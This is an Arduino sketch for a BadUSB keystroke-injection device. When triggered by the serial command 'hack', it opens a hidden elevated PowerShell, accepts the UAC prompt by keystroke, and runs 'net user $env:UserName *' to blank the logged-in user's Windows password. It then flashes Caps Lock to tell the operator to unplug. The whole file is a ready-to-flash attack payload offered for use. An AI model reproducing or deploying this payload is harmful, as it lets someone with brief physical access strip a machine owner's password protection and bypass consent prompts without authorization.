#include "Keyboard.h"

void typeKey(int key) {
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup() {
  // put your setup code here, to run once:
  Keyboard.begin();
  Serial.begin(9600);
}

void loop() {
  if (Serial.available()) {
    String text = Serial.readStringUntil('\n');
    if (text == "hack") {
      run();
    }
  }
  delay(5000);
  // put your main code here, to run repeatedly:
}

void run() {
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('d');
  Keyboard.releaseAll();
  delay(500);

  // Start powershell as admin

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);

  Keyboard.print("powershell.exe -windowstyle hidden");
  delay(200);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(500);

  Keyboard.press(KEY_LEFT_ARROW);
  Keyboard.releaseAll();
  delay(150);

  typeKey(KEY_RETURN);
  delay(2000);

  // Disable windows password

  Keyboard.print("net user $env:UserName *");

  typeKey(KEY_RETURN);

  delay(150);

  typeKey(KEY_RETURN);

  delay(150);

  typeKey(KEY_RETURN);

  delay(200);

  Keyboard.print("exit");

  typeKey(KEY_RETURN);

  // Make capslock flash to know when you can unplug the BadUSB

  Keyboard.write(KEY_CAPS_LOCK);

  delay(150);

  Keyboard.write(KEY_CAPS_LOCK);

  delay(150);

  Keyboard.write(KEY_CAPS_LOCK);

  delay(150);

  Keyboard.write(KEY_CAPS_LOCK);

  delay(2000);

  Keyboard.write(KEY_CAPS_LOCK);

  delay(150);

  Keyboard.write(KEY_CAPS_LOCK);

  delay(150);

  Keyboard.write(KEY_CAPS_LOCK);

  delay(150);

  Keyboard.write(KEY_CAPS_LOCK);

  // End of Payload

  // Stop Keyboard and Mouse
  Keyboard.end();
}
